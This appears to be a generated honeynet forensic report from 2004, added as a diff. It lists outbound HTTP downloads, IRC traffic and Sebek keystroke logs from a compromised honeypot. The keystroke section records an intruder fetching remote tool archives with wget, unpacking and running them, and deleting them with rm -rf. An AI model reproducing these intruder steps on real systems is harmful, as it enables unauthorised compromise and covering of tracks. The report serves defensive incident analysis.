@@ -1,0 +1,148 @@
+Performing initial analysis of honeywall logs, please wait.
+
+================================================================================
+
+Date: 20040802
+
+Splitting data into pcap files for each honeypot, please wait (20040802):
+-------------------------------------------------------------------------
+
+Pot: 10.2.1.145 [ 5732 EVENTS ]
+Pot: 10.2.1.146 [ 40635 EVENTS ]
+Pot: 10.2.1.147 [ 2648 EVENTS ]
+
+Outbound HTTP GETs to TCP port 80 (20040802):
+---------------------------------------------
+
+Pot: 10.2.1.145 [ 0 HTTP GETs ]
+Pot: 10.2.1.146 [ 10 HTTP GETs ]
+
+13228 2004-08-02 17:16:35.393855 10.2.1.146 -> 64.202.XXX.XXX HTTP GET /x/qd HTTP/1.0
+16191 2004-08-02 20:10:36.677479 10.2.1.146 -> 64.202.XXX.XXX HTTP GET /x/qd HTTP/1.0
+16309 2004-08-02 20:11:17.559758 10.2.1.146 -> 213.218.XXX.XXX HTTP GET /Arhive/p.tar.gz HTTP/1.0
+25708 2004-08-02 20:22:39.019922 10.2.1.146 -> 66.218.XXX.XXX HTTP GET /sslstop.tar.gz HTTP/1.0
+25815 2004-08-02 20:22:53.337162 10.2.1.146 -> 213.218.XXX.XXX HTTP GET /Arhive/psy.tgz HTTP/1.0
+27077 2004-08-02 20:37:13.767699 10.2.1.146 -> 213.218.XXX.XXX HTTP GET /Arhive/pico.tgz HTTP/1.0
+31515 2004-08-02 21:10:13.493600 10.2.1.146 -> 213.218.XXX.XXX HTTP GET /Arhive/socklist.tgz HTTP/1.0
+31923 2004-08-02 21:16:28.377246 10.2.1.146 -> 212.15.XXX.XXX HTTP GET /cgi-bin/tek HTTP/1.0
+32168 2004-08-02 21:23:09.818275 10.2.1.146 -> 213.218.XXX.XXX HTTP GET /Arhive/mech.tgz HTTP/1.0
+
+Pot: 10.2.1.147 [ 0 HTTP GETs ]
+
+FTP GETs to TCP port 20 (20040802):
+-----------------------------------
+
+Pot: 10.2.1.145 [ 0 FTP GETs ]
+Pot: 10.2.1.146 [ 0 FTP GETs ]
+Pot: 10.2.1.147 [ 0 FTP GETs ]
+
+IRC privmsg messages (20040802):
+--------------------------------
+
+Pot: 10.2.1.145 [ 0 IRC messages ]
+Pot: 10.2.1.146 [ 613 IRC messages ]
+
+CNOTICE Ede.NL.eu.example.org CNOTICE SILENCE=15 MODES=6 MAXCHANNELS=20 NICKLEN=12 MAXNICKLEN=15 :are supported by this server
+#TheExample Crystal!~Case@Creature.users.example.org TaLenT_ nick Mirabela
+#TheExample Crystal!~Case@Creature.users.example.org GesT_ nick Mirabela
+#TheExample Crystal!~Case@Creature.users.example.org _aLenT___ nick Gagica
+#TheExample Crystal!~Case@Creature.users.example.org GesT__ nick Roscata
+#TheExample Crystal!~Case@Creature.users.example.org GesT___ nick Maimuta
+#TheExample Crystal!~Case@Creature.users.example.org GesT_ nick GaOz
+#TheExample Crystal!~Case@Creature.users.example.org TaLenT___ nick Salbatica
+#TheExample Crystal!~Case@Creature.users.example.org Belea_ nick Bronzata
+#TheExample Crystal!~Case@Creature.users.example.org Belea___ nick Creatza
+
+Pot: 10.2.1.147 [ 0 IRC messages ]
+
+Sebek keystroke logs (20040802):
+--------------------------------
+
+Pot: 10.2.1.145 [ 12 Sebek records ]
+Pot: 10.2.1.146 [ 54 Sebek records ]
+
+[2004-08-02 15:23:16  10.2.1.146 20025 bash/sh 48]TERdcfl=
+[2004-08-02 15:23:16  10.2.1.146 20025 bash 48]uname;
+[2004-08-02 18:17:18  10.2.1.146 20444 bash/sh 48]TERmd  b
+[2004-08-02 18:17:18  10.2.1.146 20444 bash 48]unam;i
+[2004-08-02 18:17:34  10.2.1.146 20444 bash 48]cd tls
+[2004-08-02 18:17:37  10.2.1.146 20444 bash 48]cd ls
+[2004-08-02 18:17:43  10.2.1.146 20444 bash 48]cd /ls
+[2004-08-02 18:17:57  10.2.1.146 20444 bash 48]wgetmtar 
+[2004-08-02 18:28:09  10.2.1.146 20473 bash 0]sockwgetrtar./sels
+[2004-08-02 18:28:35  10.2.1.146 26994 bash 0]ls
+[2004-08-02 18:28:42  10.2.1.146 26994 bash 0]cd .var.t[BS][BS][BS][BS][BS][BS]/ca[BS][BS]var/tmp
+[2004-08-02 18:28:42  10.2.1.146 26994 bash 0]ks
+[2004-08-02 18:28:44  10.2.1.146 26994 bash 0]ls
+[2004-08-02 18:29:07  10.2.1.146 26994 bash 0]wgetmsa
+[2004-08-02 18:29:16  10.2.1.146 26994 bash 0]tar  tcd st
+[2004-08-02 18:29:19  10.2.1.146 26994 bash 0]./ss
+[2004-08-02 18:29:19  10.2.1.146 26990 sendmail 0]lsc.var.t/cavar/tmpksls
+[2004-08-02 18:29:21  10.2.1.146 26994 bash 0]cd ..
+[2004-08-02 18:29:27  10.2.1.146 26994 bash 0]wgetrcit
+[2004-08-02 18:32:26  10.2.1.146 26994 bash 0]tar  cd .ls
+[2004-08-02 18:32:30  10.2.1.146 26994 bash 0]pico psybc
+[2004-08-02 18:33:19  10.2.1.146 26994 bash 0]wgetdx.
+[2004-08-02 18:40:09  10.2.1.146 26994 bash 0]wget XXX/picog
+[2004-08-02 18:40:32  10.2.1.146 26994 bash 0]cds [BS][BS] ..
+[2004-08-02 18:40:38  10.2.1.146 26994 bash 0]wgetroeg
+[2004-08-02 18:57:10  10.2.1.146 26994 bash 0]tar vt
+[2004-08-02 18:57:13  10.2.1.146 26994 bash 0]mv p /
+[2004-08-02 18:57:15  10.2.1.146 26994 bash 0]ls
+[2004-08-02 18:57:18  10.2.1.146 26994 bash 0]cd
+[2004-08-02 18:57:19  10.2.1.146 26994 bash 0]ls
+[2004-08-02 18:57:28  10.2.1.146 26994 bash 0]picoar
+[2004-08-02 19:11:41  10.2.1.146 26994 bash 0]w[BS]cd /var/tmp
+[2004-08-02 19:11:42  10.2.1.146 26994 bash 0]ls
+[2004-08-02 19:12:04  10.2.1.146 26994 bash 0]c[BS]ww[BS]get XXX[BS].com/Arhv[BS]ive/\[BS][BS][BS][BS][BS][BS]hive/socklist.tgz
+[2004-08-02 19:18:10  10.2.1.146 26994 bash 0]tar v
+[2004-08-02 19:18:13  10.2.1.146 26994 bash 0]tar fsock.
+[2004-08-02 19:18:15  10.2.1.146 26994 bash 0]mv slr
+[2004-08-02 19:18:18  10.2.1.146 26994 bash 0]socklist
+[2004-08-02 19:21:29  10.2.1.146 26994 bash 0]ps nx[BS][BS]ax
+[2004-08-02 19:21:50  10.2.1.146 26994 bash 0]wget-.vt
+[2004-08-02 19:29:56  10.2.1.146 26990 sendmail 0].lspico  cd .lscdlswcd /var/tmplscwwget XXX/.com/Arhvive/\hive/socklist.tgzsocklistps nxax
+[2004-08-02 19:30:31  10.2.1.146 26994 bash 0]tar mcd e./mecd ..
+[2004-08-02 19:30:32  10.2.1.146 26994 bash 0]ls
+[2004-08-02 19:30:34  10.2.1.146 26994 bash 0]rm -rf *z
+[2004-08-02 19:30:36  10.2.1.146 26994 bash 0]rm -rf p
+[2004-08-02 19:30:38  10.2.1.146 26994 bash 0]rm -rf p.c
+[2004-08-02 19:30:46  10.2.1.146 26994 bash 0]rm -rf sto[BS][BS]slstop
+[2004-08-02 19:30:47  10.2.1.146 26994 bash 0]ls
+
+Pot: 10.2.1.147 [ 18 Sebek records ]
+
+[2004-08-02 15:22:15  10.2.1.147 5039 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:16  10.2.1.147 5040 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:18  10.2.1.147 5041 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:19  10.2.1.147 5042 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:21  10.2.1.147 5043 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:22  10.2.1.147 5044 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:24  10.2.1.147 5045 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:25  10.2.1.147 5046 sshd 0]SSH-2.0-libssh-0.1
+[2004-08-02 15:22:27  10.2.1.147 5047 sshd 0]SSH-2.0-libssh-0.1
+
+
+Re-assembling interesting TCP streams (20040802):
+-------------------------------------------------
+
+Pot: 10.2.1.145 [ 6 interesting TCP streams ]
+Pot: 10.2.1.146 [ 32 interesting TCP streams ]
+Pot: 10.2.1.147 [ 5 interesting TCP streams ]
+
+Extracted files downloaded by HTTP (20040802):
+----------------------------------------------
+
+/tmp/output/20040802/10.2.1.146/extracted_files/213.218.XXX.XXX/session_2619/p.tar.gz
+/tmp/output/20040802/10.2.1.146/extracted_files/213.218.XXX.XXX/session_2673/psy.tgz
+/tmp/output/20040802/10.2.1.146/extracted_files/213.218.XXX.XXX/session_2723/pico.tgz
+/tmp/output/20040802/10.2.1.146/extracted_files/213.218.XXX.XXX/session_4384/socklist.tgz
+/tmp/output/20040802/10.2.1.146/extracted_files/66.218.XXX.XXX/session_2670/sslstop.tar.gz
+/tmp/output/20040802/10.2.1.146/extracted_files/213.218.XXX.XXX/session_4440/mech.tgz
+
+Extracted files downloaded by FTP (20040802):
+---------------------------------------------
+
+<none>
+
+================================================================================
